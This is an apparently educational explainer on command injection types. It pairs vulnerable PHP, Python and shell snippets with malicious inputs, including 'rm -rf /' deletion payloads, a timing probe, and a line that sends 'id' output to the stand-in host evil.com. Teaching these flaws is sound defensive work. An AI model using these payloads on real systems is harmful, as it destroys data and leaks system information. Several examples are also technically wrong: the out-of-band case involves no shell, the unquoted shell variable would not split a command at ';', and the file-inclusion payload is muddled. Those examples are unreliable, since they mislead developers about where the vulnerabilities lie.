## Command Injection: Types and Explanation

Command injection is a critical security vulnerability that allows attackers to execute arbitrary commands on the host operating system via a vulnerable application. Below are the main types of command injection, along with brief explanations and example snippets.

### 1. **Unfiltered Input Command Injection**

- **Explanation**: Occurs when user-supplied input is directly passed to the system shell without proper sanitization or filtering. The attacker can inject additional commands into the input string.

- **Injection Snippet**:
  ```bash
  # Vulnerable code snippet in PHP
  $filename = $_GET['filename'];
  system("cat " . $filename);
  
  # Malicious input
  filename=example.txt; rm -rf /
  ```

  - **Result**: This would display the contents of `example.txt` and then delete all files and directories on the server.

### 2. **Blind Command Injection**

- **Explanation**: The output of the injected command is not returned to the attacker. However, the attacker can infer the success or failure of the command based on external factors like the application's behavior, response time, or changes in the system state.

- **Injection Snippet**:
  ```bash
  # Vulnerable code snippet in Python
  ip = request.args.get('ip')
  os.system("ping -c 4 " + ip)
  
  # Malicious input
  ip=127.0.0.1; sleep 10
  ```

  - **Result**: The application delays for 10 seconds, indicating that the command was executed.

### 3. **Out-of-Band (OOB) Command Injection**

- **Explanation**: The attacker injects a command that causes the vulnerable system to make a request to an external server controlled by the attacker. This type of injection is useful when direct interaction or feedback is not available.

- **Injection Snippet**:
  ```bash
  # Vulnerable code snippet in PHP
  $url = $_GET['url'];
  file_get_contents("http://" . $url);
  
  # Malicious input
  url=evil.com/$(id)
  ```

  - **Result**: The server makes a request to `evil.com` with the output of the `id` command appended to the URL.

### 4. **File Inclusion Command Injection**

- **Explanation**: Command injection can also occur through vulnerable file inclusion functions, where user input is included in the path of a file that the system executes or reads.

- **Injection Snippet**:
  ```bash
  # Vulnerable code snippet in PHP
  $file = $_GET['file'];
  include($file);
  
  # Malicious input
  file=/var/www/html/evil.php?cmd=whoami
  ```

  - **Result**: If `evil.php` is a script that executes commands, this will run `whoami` on the server.

### 5. **Chained Command Injection**

- **Explanation**: Attackers use shell operators (like `&&`, `||`, `|`, `;`) to chain multiple commands together. This is often used to append malicious commands to an existing, legitimate command.

- **Injection Snippet**:
  ```bash
  # Vulnerable code snippet in Shell script
  user_input="$1"
  ls $user_input
  
  # Malicious input
  user_input="; rm -rf /"
  ```

  - **Result**: The command `ls` runs, and then the malicious `rm -rf /` is executed, potentially wiping out the filesystem.

---

### Summary

- **Command Injection** is a severe vulnerability that allows an attacker to execute arbitrary commands on a host machine.
- Types include **Unfiltered Input**, **Blind Injection**, **Out-of-Band Injection**, **File Inclusion Injection**, and **Chained Command Injection**.
- Each type has different methods of execution, but all involve manipulating user input to execute unintended commands.

By understanding these different types of command injection, developers and security professionals can better protect applications from these vulnerabilities.